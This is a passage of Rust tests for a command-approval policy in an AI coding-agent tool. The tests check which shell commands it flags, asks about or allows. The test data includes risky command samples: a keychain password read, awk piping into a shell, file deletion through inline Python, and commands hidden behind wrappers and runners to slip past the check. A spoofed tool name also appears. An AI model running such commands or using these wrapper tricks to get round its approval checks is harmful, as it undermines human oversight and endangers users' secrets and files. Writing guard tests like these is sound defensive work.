            "gem sources --remove https://rubygems.org",
            "bundle config set path vendor/bundle",
            "bundle config set --local path vendor/bundle",
            "bundle config --global jobs 4",
            "bundle config path vendor/bundle",
            "bundle config unset path",
            "bundle config --delete path",
            "composer config minimum-stability dev",
            "composer config --global github-oauth.github.com abc",
            "composer config repositories.local vcs http://localhost:3000/pkg.git",
            "composer config --unset minimum-stability",
            "composer config --editor",
            "composer global require phpunit/phpunit",
            "composer global update",
            // behind a wrapper, a shell, a package runner or another runner
            "timeout 60 npm config set registry http://localhost:4873",
            "sh -c 'pip config set global.index-url http://localhost:3141'",
            "pnpm exec npm config set registry http://localhost:4873",
            "uv run npm config set registry http://localhost:4873",
            "bundle exec gem sources --add http://localhost:9292",
            "cd web && npm config set registry http://localhost:4873",
            // `c` is npm's and pnpm's short name for `config`
            "npm c set registry http://localhost:4873",
            "pnpm c set store-dir .pnpm-store",
            "npm --prefix web c set registry http://localhost:4873",
            "npm --prefix c config set registry http://localhost:4873",
            "npm c delete registry",
            // what it is told to do stands behind an option's value
            "npm config --location global set registry http://localhost:4873",
            "npm config --location project delete registry",
            "pip config --editor vi edit",
            "bun exec 'npm config set registry http://localhost:4873'",
        ] {
            assert!(risks(c).iter().any(|r| r == OWN_SETUP), "{c}: {:?}", risks(c));
            for mode in [ApprovalMode::Balanced, ApprovalMode::Autonomous] {
                let v = eval_in(wt, mode, false, command(c, wt));
                assert!(asks_about(&v, OWN_SETUP), "{c} in {mode:?}: {v:?}");
            }
            let v = eval_in(wt, ApprovalMode::Full, false, command(c, wt));
            assert!(matches!(v, Verdict::Allow { .. }), "full access allows it: {c}: {v:?}");
        }
        // `cargo login` is your account at the registry: it asks the same way, as a publish.
        for mode in [ApprovalMode::Balanced, ApprovalMode::Autonomous] {
            assert!(asks_about(&eval_in(wt, mode, false, command("cargo login abc", wt)), "publish"), "{mode:?}");
        }
        assert!(matches!(eval_in(wt, ApprovalMode::Full, false, command("cargo login abc", wt)), Verdict::Allow { .. }));

        // Reads of the settings, and words that only look like a write.
        for c in [
            "npm config get registry",
            "npm config list",
            "npm config ls -l",
            "npm config",
            "npm get registry",
            "pnpm config get store-dir",
            "pnpm config list",
            "yarn config get registry",
            "yarn config list",
            "yarn config",
            "yarn set version stable",
            "pip config list",
            "pip config get global.index-url",
            "pip config debug",
            "poetry config --list",
            "poetry config virtualenvs.in-project",
            "poetry config",
            "gem sources",
            "gem sources --list",
            "gem sources -l",
            "bundle config",
            "bundle config list",
            "bundle config get path",
            "bundle config path",
            "bundle exec config set path vendor/bundle",
            "composer config --list",
            "composer config -l",
            "composer config --global --list",
            "composer config minimum-stability",
            "composer validate",
            "npm run config set registry",
            "npm run set-version",
            "npm c get registry",
            "npm c list",
            "pnpm c get store-dir",
            "npm config --json list",
            "npm config --location project get registry",
            "npm run c set registry",
            "cargo c",
            "yarn c set registry",
        ] {
            assert!(risks(c).is_empty(), "{c}: {:?}", risks(c));
            let v = eval_in(wt, ApprovalMode::Autonomous, false, command(c, wt));
            assert!(matches!(v, Verdict::Allow { .. }), "{c}: {v:?}");
        }
        assert!(!risks("npm install config").iter().any(|r| r == OWN_SETUP), "a package named config");
        assert!(!risks("npm install c").iter().any(|r| r == OWN_SETUP), "a package named c");
    }

    /// A runner whose own options are not read (`uv run`, `poetry run`, `bundle exec`…): a
    /// word behind it that names a package manager, a program that publishes, git, gh or
    /// docker is read as the command it may start. A line with no such word is read as before.
    #[test]
    fn the_command_behind_another_runner_is_read_by_its_name() {
        for c in [
            "uv run npm publish",
            "poetry run twine upload dist/*",
            "bundle exec gem push x.gem",
            "pdm run npm publish",
            "hatch run cargo publish",
            "pipenv run twine upload dist/pkg.tar.gz",
            "rye run npm publish",
            "conda run -n web npm publish",
            "mise x -- npm publish",
            "mise exec node@20 -- npm publish",
            // behind the runner's own options, whatever they take
            "uv run --project web npm publish",
            "uv --directory web run npm publish",
            "uv run env CI=1 npm publish",
            "uv run ./node_modules/.bin/npm publish",
            // one runner behind another
            "pnpm exec uv run npm publish",
            "uv run pnpm exec npm publish",
            "poetry run uv run npm publish",
            "timeout 60 uv run npm publish",
            "sh -c 'uv run npm publish'",
        ] {
            assert!(risks(c).iter().any(|r| r == "publish"), "{c}: {:?}", risks(c));
        }
        for (c, risk) in [
            ("uv run git push", "push"),
            ("bundle exec git push origin main", "push"),
            ("uv run git commit -m wip", GIT_WRITE),
            ("uv run npm install left-pad", PACKAGE_INSTALL),
            ("poetry run pip install requests", PACKAGE_INSTALL),
            ("uv run npm install -g typescript", "outside worktree"),
            ("uv run npm config set registry http://localhost:4873", OWN_SETUP),
            ("uv run gh pr create", "network"),
            ("uv run docker ps", "containers"),
            // A word that only looks like a program asks once too often.
            ("uv run pytest -k docker", "containers"),
        ] {
            assert!(risks(c).iter().any(|r| r == risk), "{c}: {:?}", risks(c));
        }
        for c in [
            "uv run pytest -q",
            "poetry run python x.py",
            "poetry run pytest",
            "bundle exec rake test",
            "hatch run test",
            "pdm run lint",
            "mise run build",
            "uv run python tools/release.py publish",
            // a program of the list that does nothing the rules name
            "uv run cargo test",
            "uv run npm test",
            "uv run git status",
            "uv run pytest -k git",
        ] {
            assert!(risks(c).is_empty(), "{c}: {:?}", risks(c));
        }
        for c in ["uv run pytest -q", "poetry run pytest"] {
            assert_eq!(classify_command(c, &[]), Some(TEST_RUNNER), "{c}");
        }
    }

    /// `exec` runs a line in a shell when a `-c` of the package manager's own says so. npm
    /// reads every option of the line as its own, up to a `--`. pnpm and yarn give the words
    /// behind the program to that program.
    #[test]
    fn only_a_package_managers_own_c_runs_a_line_in_a_shell() {
        let dynamic = |c: &str| risks(c).iter().any(|r| r == "runs dynamic code");
        for c in [
            "npm exec -c 'x'",
            "npm exec --call x",
            "npm exec --call=x",
            "npm exec eslint -c .eslintrc.json",
            "npm --prefix web exec eslint -c x.json",
            "pnpm exec -c 'npm run build'",
            "pnpm -c exec 'npm run build'",
            "pnpm exec --shell-mode 'npm run build'",
            // an option of pnpm's that may take `eslint` as its value: `-c` may be pnpm's own
            "pnpm exec --reporter eslint -c x.json",
        ] {
            assert!(dynamic(c), "{c}: {:?}", risks(c));
        }
        for c in [
            "pnpm exec eslint -c x.json",
            "pnpm exec eslint -c .eslintrc.json src",
            "pnpm exec prettier -c .",
            "pnpm --filter web exec eslint -c x.json",
            "pnpm exec -- eslint -c x.json",
            "yarn exec eslint -c x.json",
            "npm exec -- eslint -c .eslintrc.json",
        ] {
            assert!(!dynamic(c), "{c}: {:?}", risks(c));
        }
    }

    /// Gradle and Maven run every task or phase on the line: only `test`, `check` and
    /// `verify` alone, with the options that change nothing about what runs, are a test run.
    #[test]
    fn a_java_test_run_is_one_with_nothing_else_on_the_line() {
        for c in [
            "gradle test",
            "gradle check",
            "mvn test",
            "mvn verify",
            "gradle test check",
            "gradle -q test",
            "gradle test --console=plain --no-daemon",
            "gradle --offline check",
            "mvn -B test",
            "mvn -q -o verify",
            "mvn --batch-mode --offline test",
            "mvn test 2>&1 | tail -20",
            "cd app && gradle test",
        ] {
            assert_eq!(classify_command(c, &[]), Some(TEST_RUNNER), "{c}");
        }
        for c in [
            // a wrapper in the repo is a script, under any name
            "./gradlew test",
            "./mvnw verify",
            "gradlew test",
            "mvnw test",
            // no task, or one that is no test run
            "gradle",
            "mvn",
            "gradle -q",
            "gradle build",
            "gradle assemble",
            "mvn compile",
            "mvn package",
            "mvn install",
            // a second task runs too
            "gradle test publish",
            "gradle test assemble",
            "gradle clean test",
            "mvn deploy",
            "mvn test deploy",
            "mvn clean test",
            "gradle :app:test",
            // an option that is not listed, with its value or without
            "gradle test --tests com.example.FooTest",
            "gradle test -Pprofile=ci",
            "gradle -b other.gradle test",
            "gradle -p sub test",
            "gradle test -x lint",
            "gradle test -B",
            "mvn test -DskipTests=false",
            "mvn -f other/pom.xml test",
            "mvn -pl core test",
            "mvn -P release verify",
            "mvn test --no-daemon",
        ] {
            assert_eq!(classify_command(c, &[]), None, "{c}");
        }
        let wt = Path::new("/w/t1");
        let balanced = |c: &str| eval_in(wt, ApprovalMode::Balanced, false, command(c, wt));
        for c in ["gradle test", "gradle check", "mvn test", "mvn verify"] {
            assert!(matches!(balanced(c), Verdict::Allow { .. }), "{c}: {:?}", balanced(c));
        }
        for c in ["./gradlew test", "gradle build", "mvn clean test"] {
            assert!(matches!(balanced(c), Verdict::Ask { .. }), "{c}: {:?}", balanced(c));
        }
        for c in ["gradle test publish", "mvn deploy"] {
            assert!(asks_about(&balanced(c), "publish"), "{c}: {:?}", balanced(c));
        }
    }

    #[test]
    fn python_m_pip_is_read_like_pip() {
        for c in [
            "python -m pip install requests",
            "python3 -m pip install -r requirements.txt",
            "python3.12 -m pip install requests",
            "python -mpip install requests",
            "python3 -um pip install requests",
            "python -W ignore -m pip install requests",
            "python -m uv pip install requests",
            "uv run python -m pip install requests",
            "find . -name setup.py -exec python -m pip install -e . \\;",
        ] {
            assert!(risks(c).iter().any(|r| r == PACKAGE_INSTALL), "{c}: {:?}", risks(c));
        }
        for c in ["python3 -m pip install --user requests", "python -m pip install --break-system-packages requests", "poetry run python -m pip install --user x"] {
            assert!(risks(c).iter().any(|r| r == "outside worktree"), "{c}: {:?}", risks(c));
        }
        // Another module, a script with its own `-m`, or pip's name as a word of the code.
        for c in ["python -m pytest -q", "python -m venv .venv", "python scripts/tool.py -m pip", "python3 pip_report.py"] {
            assert!(risks(c).is_empty(), "{c}: {:?}", risks(c));
        }
        assert!(risks("python3 -m http.server 8000").iter().any(|r| r == "network"));
        assert_eq!(classify_command("python -m pytest -q", &[]), Some(TEST_RUNNER), "a test run as before");
    }

    /// security#4: code given to an interpreter on the command line holds its paths and
    /// addresses where no check reads them.
    #[test]
    fn code_on_the_command_line_runs_dynamic_code() {
        let dynamic = |c: &str| risks(c).iter().any(|r| r == "runs dynamic code");
        for c in [
            "python3 -c 'print(1)'",
            "python -Bc 'print(1)'",
            "python3.12 -c 'print(1)'",
            "pypy3 -c 'print(1)'",
            "python -W ignore -c 'print(1)'",
            "node -e 'console.log(1)'",
            "node --eval 'console.log(1)'",
            "node --eval=1",
            "node -p '1+1'",
            "node -pe '1+1'",
            "node -r ts-node/register -e 'run()'",
            "node --require ./setup.js -e 'run()'",
            "bun -e 'console.log(1)'",
            "bun --print '1+1'",
            "deno eval 'console.log(1)'",
            "ruby -e 'puts 1'",
            "ruby -rjson -e 'puts 1'",
            "ruby -r json -ne 'puts 1'",
            "perl -e 'print 1'",
            "perl -pe 's/a/b/' notes.txt",
            "perl -i -pe 's/a/b/' notes.txt",
            "perl -MFile::Temp -E 'say 1'",
            "perl -F: -lane 'print $F[0]' notes.txt",
            "php -r 'echo 1;'",
            "osascript -e 'tell application \"Finder\" to quit'",
            "awk 'BEGIN { system(\"id\") }'",
            "awk '{ print | \"sh\" }' notes.txt",
            "awk 'BEGIN { \"date\" | getline d; print d }'",
            "awk '{ print $1 | cmd }' cmd=sh notes.txt",
            "awk -F'|' '{ print \"a | b\" | \"sh\" }' notes.txt",
            // behind a wrapper, a runner or `find -exec`
            "timeout 5 python3 -c 'print(1)'",
            "env FOO=1 node -e 'run()'",
            "uv run python -c 'print(1)'",
            "poetry run python -c 'print(1)'",
            "pnpm exec node -e 'run()'",
            "bun run node -e 'run()'",
            "bundle exec ruby -e 'puts 1'",
            "find . -name '*.py' -exec python -c 'print(1)' {} \\;",
        ] {
            assert!(dynamic(c), "{c}: {:?}", risks(c));
        }
        // A script file, and the script's own options after it, are no code on the line.
        for c in [
            "python3 scripts/gen.py",
            "python3 scripts/gen.py -c config.yaml",
            "python -m pytest -c pytest.ini",
            "python -W ignore scripts/gen.py",
            "python -Wignore::DeprecationWarning scripts/gen.py",
            "node scripts/gen.js",
            "node server.js -p 3000",
            "node --test",
            "node -r ts-node/register src/main.ts",
            "bun install -p",
            "bun test",
            "bun run build",
            "deno run -A main.ts",
            "ruby -Itest test/a_test.rb",
            "ruby -rset script.rb",
            "perl script.pl -e",
            "perl -MFile::Temp script.pl",
            "php artisan migrate",
            "php -d memory_limit=1G script.php",
            "awk '{print $1}' notes.txt",
            "awk -F'|' '{print $2}' notes.txt",
            "awk '/a|b/ {print}' notes.txt",
            "awk '$1 == \"a\" || $2 == \"b\"' notes.txt",
            // a `|` in a string of the program, or in a variable's value, is text
            "awk -F, '{print $1 \" | \" $2}' a.csv",
            "awk 'BEGIN{FS=\"|\"} {print $2}' t.md",
            "awk 'BEGIN{OFS=\"|\"} {$1=$1; print}' f",
            "awk '{n=split($0,a,\"|\"); print a[2]}' f",
            "awk '{ printf \"%s | %s\\n\", $1, $2 }' f",
            "awk -v sep='|' '{print $1 sep $2}' f",
            "awk '$1 ~ /^(a|b)$/ || \"x\" == $2' f",
            "uv run pytest",
            "pnpm exec vitest run",
            "npm install python-shell",
        ] {
            assert!(!dynamic(c), "{c}: {:?}", risks(c));
        }
        let wt = Path::new("/w/t1");
        let v = eval_in(wt, ApprovalMode::Autonomous, false, command("python3 -c 'import os; os.remove(os.path.expanduser(\"~/x\"))'", wt));
        assert!(asks_about(&v, "runs dynamic code"), "{v:?}");
    }

    /// security#4: programs that reach another machine, change the system, or show what the
    /// clipboard, the screen or the keychain holds.
    #[test]
    fn more_programs_have_a_risk_name() {
        for (c, risk) in [
            ("dig example.com", "network"),
            ("nslookup example.com", "network"),
            ("host example.com", "network"),
            ("ping -c 1 example.com", "network"),
            ("whois example.com", "network"),
            ("xh get example.com", "network"),
            ("openssl s_client -connect example.com:443", "network"),
            ("python3 -m http.server 8000", "network"),
            ("aws s3 ls", "network"),
            ("gcloud compute instances list", "network"),
            ("kubectl get pods", "network"),
            ("terraform apply -auto-approve", "network"),
            ("vercel deploy --prod", "network"),
            ("open https://example.com/?q=1", "network"),
            ("open https://example.com/?q=1", "system"),
            ("open build/report.html", "system"),
            ("open -a Terminal run.command", "system"),
            ("xdg-open build/report.html", "system"),
            ("crontab jobs.txt", "system"),
            ("at now + 1 minute", "system"),
            ("defaults write com.apple.dock autohide -bool true", "system"),
            ("osascript scripts/quit.scpt", "system"),
            ("pbpaste", classify::SECRETS),
            ("screencapture shot.png", classify::SECRETS),
            ("security find-generic-password -s codly -w", classify::SECRETS),
        ] {
            assert!(risks(c).iter().any(|r| r == risk), "{c}: {:?}", risks(c));
        }
        for c in ["openssl rand -hex 16", "openssl dgst -sha256 notes.txt", "pbcopy", "hostname"] {
            assert!(risks(c).is_empty(), "{c}: {:?}", risks(c));
        }
        assert!(!risks("open build/report.html").iter().any(|r| r == "network"));
    }

    /// In your own project folder the floor looks at the folder: a word after `git checkout`
    /// or `git reset` that names a file there is a file, and a build folder that is a link is
    /// whatever the link points at.
    #[test]
    fn the_own_folder_floor_knows_files_and_links() {
        let (_tmp, root) = worktree();
        for d in ["src", "build", "node_modules/.cache", "docs"] {
            std::fs::create_dir_all(root.join(d)).unwrap();
        }
        std::fs::write(root.join("src/a.ts"), "export {}").unwrap();
        std::os::unix::fs::symlink(root.join("docs"), root.join("dist")).unwrap();
        std::os::unix::fs::symlink(root.join("src"), root.join("node_modules/pkg")).unwrap();
        let full = |c: &str| {
            let ctx = PolicyCtx { mode: ApprovalMode::Full, worktree: Some(root.as_path()), verify: &[], read_only: false, edits: false, checkout: Some(root.as_path()), own_mcp: &[], provider: Some(Provider::Claude) };
            evaluate(&approval(command(c, &root)), &ctx)
        };
        for (c, why) in [
            ("git checkout src/a.ts", DISCARDS_WORK),
            ("git checkout HEAD~1 src/a.ts", DISCARDS_WORK),
            ("git checkout src", DISCARDS_WORK),
            ("git checkout --theirs src/a.ts", DISCARDS_WORK),
            ("git checkout '*.ts'", DISCARDS_WORK),
            ("git checkout HEAD~1 ':(glob)**/*.ts'", DISCARDS_WORK),
            ("git -C src checkout a.ts", DISCARDS_WORK),
            ("cd src && git checkout a.ts", DISCARDS_WORK),
            ("git reset main", REWRITES_HISTORY),
            ("rm -rf dist", DELETES_FOLDERS),
            ("rm -rf dist/", DELETES_FOLDERS),
            ("rm -rf dist/guide", DELETES_FOLDERS),
            ("rm -rf node_modules/pkg/", DELETES_FOLDERS),
        ] {
            let v = full(c);
            assert!(asks_about(&v, why) && asks_about(&v, "your project folder itself"), "{c}: {v:?}");
        }
        for c in [
            "git checkout main",
            "git checkout a.ts",
            "git checkout -b src",
            "git checkout -b fix src",
            "git checkout --orphan docs",
            "git reset src/a.ts",
            "git reset HEAD src/a.ts",
            "rm -rf build",
            "rm -rf node_modules",
            "rm -rf node_modules/.cache",
        ] {
            let v = full(c);
            assert!(matches!(v, Verdict::Allow { .. }), "{c}: {v:?}");
        }
        // From a worktree, a build folder of yours that is a link is not a build folder either.
        let (_tmp2, wt) = worktree();
        let from_wt = |c: &str| {
            let ctx = PolicyCtx { mode: ApprovalMode::Full, worktree: Some(wt.as_path()), verify: &[], read_only: false, edits: false, checkout: Some(root.as_path()), own_mcp: &[], provider: Some(Provider::Claude) };
            evaluate(&approval(command(c, &wt)), &ctx)
        };
        let v = from_wt(&format!("rm -rf {}/dist/guide", root.display()));
        assert!(asks_about(&v, DELETES_FOLDERS), "{v:?}");
        let v = from_wt(&format!("rm -rf {}/build", root.display()));
        assert!(matches!(v, Verdict::Allow { .. }), "{v:?}");
    }

    #[test]
    fn only_qualified_codly_tool_names_count() {
        assert!(is_codly_tool("mcp__codly__codly_board"));
        assert!(is_codly_tool("codly_codly_submit_report"));
        assert!(is_codly_tool("codly__codly_post_note"));
        assert!(!is_codly_tool("codly_board"));
        assert!(!is_codly_tool("codly_submit_report"));
        assert!(!is_codly_tool("mcp__evil__codly_board"));
    }
}
